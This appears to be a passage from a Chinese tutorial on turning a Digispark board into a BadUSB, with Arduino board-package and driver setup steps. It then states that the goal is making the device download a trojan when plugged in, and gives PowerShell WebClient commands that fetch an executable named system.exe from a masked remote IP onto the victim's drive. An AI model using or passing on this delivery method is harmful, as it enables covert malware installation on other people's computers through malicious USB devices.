##### 0x01开始踩坑

1.加载 Digispark 的板子，打开 Arduino 选择文件 > 首选项 >

![](../Images/554319b4ea9fd78a326e787f9d5c2cf0.png)

2.在下图位置加上如下 URL ，加载其他的开发板。

  

http://digistump.com/package\_digistump\_index.json

  

![](../Images/c9af2f1c8ac9df4cab0db4bbececb1c8.png)

3.选择工具 > 板 > Boards Manager

  

![](../Images/1418f506ecd875f2c8f1e49d0156cdcf.png)

4.等待下图的进度条完成，然后在上方右侧的框中输入Di 看到 Digistump 这个，点击安装，等待安装完成。(很慢......)

![](../Images/08abf1860c8dbfc2b35912f1c10ceb69.png)

![](../Images/cfe5df268b2b119e30a4eddcda533032.png)

5.安装完成以后重新选择工具 > 板，就可以看见刚才安装好的，点击选择。

![](../Images/e304e57763315cf95eb01d341aa5f993.png)

6.解压 Digispark 文件安装驱动，64位安装 DPinst.exe 32位安装 DPinst.exe。

(无脑安装点击就行了。)

![](../Images/f00662aea97f4c79c26b9f21d7a36584.png)

关键点在于怎么让 badusb 插上以后下载木马文件。

这里我们用到 windows 的powershell 下载文件的命令。

操作如下：

在 windows  运行 win+r 输入 powershell

在弹出的 shell 中输入

$client = new-object System.Net.WebClient      

$client.DownloadFile('http://\*\*.\*\*.\*\*.\*\*/system.exe' ,'D:\\system.exe')    

![](../Images/bd37602777daeb84a999d0c8b176077e.png)

我们就可以成功的下载文件。
